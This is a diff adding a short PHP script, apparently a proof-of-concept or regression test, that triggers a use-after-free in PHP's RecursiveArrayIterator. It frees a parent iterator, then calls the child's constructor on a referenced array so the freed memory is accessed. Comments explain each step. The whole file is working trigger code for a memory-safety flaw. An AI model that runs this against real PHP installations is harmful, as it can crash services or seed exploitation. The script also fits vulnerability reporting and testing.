@@ -1,0 +1,16 @@
+<?php
+// Step 1: Create parent iterator with nested array
+$parent = new RecursiveArrayIterator([0 => [1, 2, 3, 4, 5]]);
+
+// Step 2: Get child iterator - stores bucket pointer to parent's HashTable
+$child = $parent->getChildren();
+
+// Step 3: Free parent - HashTable is freed, bucket becomes dangling
+unset($parent);
+
+// Step 4: Create array with refcount > 1 to trigger vulnerable code path
+$arr = [10, 20, 30];
+$ref = &$arr;
+
+// Step 5: Trigger UAF - accesses freed bucket->val
+$child->__construct($arr);
